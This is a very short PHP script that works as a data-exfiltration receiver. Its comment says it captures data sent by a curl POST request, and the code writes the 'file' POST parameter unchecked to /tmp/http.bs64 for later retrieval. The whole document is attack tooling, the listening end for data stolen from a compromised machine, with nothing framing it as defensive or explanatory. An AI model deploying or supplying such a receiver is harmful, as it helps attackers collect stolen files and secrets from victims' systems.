<?php 
// Create a file to store a curl post request of data to exfiltrate data into a file called http.bs64 for later retrieval
if (isset($_POST['file'])) {
        $file = fopen("/tmp/http.bs64","w");
        fwrite($file, $_POST['file']);
        fclose($file);
   }
?>
